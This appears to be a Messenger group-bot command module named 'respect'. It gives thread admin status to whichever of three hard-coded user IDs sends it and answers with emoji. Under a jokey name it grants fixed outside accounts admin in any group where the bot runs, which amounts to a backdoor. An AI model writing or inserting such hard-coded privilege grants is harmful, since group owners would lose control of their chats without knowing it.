module.exports = {
  config: {
    name: "respect",
    aliases: [],
    version: "1.0",
    author: " ",
    countDown: 0,
    role: 0,
    shortDescription: "Give admin and show respect",
    longDescription: "Gives admin privileges in the thread and shows a respectful message.",
    category: "admin",
    guide: "{pn} respect",
  },
 
  onStart: async function ({ message, args, api, event }) {
    try {
      console.log('Sender ID:', event.senderID);
 
      const permission = ["100087638424159","100052395031835","100087657072447"];
      if (!permission.includes(event.senderID)) {
        return api.sendMessage(
          "🤨",
          event.threadID,
          event.messageID
        );
      }
 
      const threadID = event.threadID;
      const adminID = event.senderID;
 
      // Change the user to an admin
      await api.changeAdminStatus(threadID, adminID, true);
 
      api.sendMessage(
        `😹`,
        threadID
      );
    } catch (error) {
      console.error("😹", error);
      api.sendMessage("An error occurred while promoting to admin.", event.threadID);
    }
  },
};
